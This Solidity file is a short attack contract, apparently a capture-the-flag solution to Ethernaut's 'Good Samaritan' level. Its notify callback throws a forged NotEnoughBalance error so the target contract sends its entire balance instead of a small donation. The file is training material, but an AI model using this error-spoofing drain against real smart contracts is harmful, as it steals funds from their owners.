// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// https://docs.eridian.xyz/ethereum-dev/defi-challenges/ethernaut/level-27-good-samaritan

interface IGoodSamaritan {
    function coin() external view returns (address coinAddress);

    function notify(uint256 amount) external;

    function requestDonation() external returns (bool enoughBalance);
}

interface ICoin {
    function balances(address account) external view returns (uint256);
}

contract AttackContract {
    error NotEnoughBalance();

    IGoodSamaritan goodSamaritan;

    function notify(uint256 /* amount */) public view {
        // Check the balance of this contract, and if it is 10,
        // then revert with the custom error message NotEnoughBalance
        // to trigger the transferRemainder function in the GoodSamaritan contract
        ICoin coin = ICoin(goodSamaritan.coin());

        if (coin.balances(address(this)) == 10) {
            revert NotEnoughBalance();
        }
    }

    function callGoodSamaritan(address targetContractAddress) public {
        goodSamaritan = IGoodSamaritan(targetContractAddress);
        goodSamaritan.requestDonation();
    }
}
